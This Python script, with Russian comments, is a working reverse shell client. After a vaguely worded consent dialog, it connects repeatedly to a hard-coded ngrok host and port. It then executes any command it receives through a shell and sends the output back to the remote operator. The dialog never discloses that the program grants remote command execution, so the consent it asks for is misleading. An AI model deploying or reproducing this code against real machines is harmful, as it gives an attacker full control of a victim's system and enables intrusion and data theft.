import socket
import os
import subprocess
import time
import tkinter as tk
from tkinter import messagebox


def request_permission():
    # Создаем окно для запроса разрешения
    root = tk.Tk()
    root.withdraw()  # Скрыть основное окно
    permission = messagebox.askyesno("Запрос разрешения", "Эта программа будет подключаться к вашему интренету для дальнейших действий. Вы хотите продолжить?")
    root.destroy()  # Уничтожить окно после ответа
    return permission

def start_client():
    if not request_permission():
        print("Пользователь отказался от подключения.")
        return
    
    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect(('4.tcp.ngrok.io', 14971))
            print("Подключено к серверу.")
            break
        except Exception as e:
            print(f"Ошибка подключения: {e}. Повторная попытка через 5 секунд.")
            time.sleep(5)

    current_directory = os.getcwd()
    
    while True:
        try:
            command = client_socket.recv(1024).decode('utf-8')
            print(f"Получена команда: {command}")

            if command.lower() == 'exit':
                break

            if command.startswith("cd "):
                path = command.split(" ", 1)[1]
                try:
                    os.chdir(path)
                    current_directory = os.getcwd()
                    response = f"Текущая директория изменена на: {current_directory}"
                except Exception as e:
                    response = str(e)
            else:
                try:
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                    response = output.decode('utf-8', errors='replace')
                except subprocess.CalledProcessError as e:
                    response = e.output.decode('utf-8', errors='replace')
                except Exception as e:
                    response = str(e)

            response += "END_OF_MSG"
            client_socket.send(response.encode('utf-8'))

        except ConnectionResetError:
            print("Соединение с сервером разорвано. Попытка переподключения...")
            client_socket.close()
            break
        except Exception as e:
            print(f"Ошибка на клиенте: {e}")
            break

    client_socket.close()
    print("Клиент завершил работу. Попытка переподключения...")
    time.sleep(5)

if __name__ == "__main__":
    start_client()
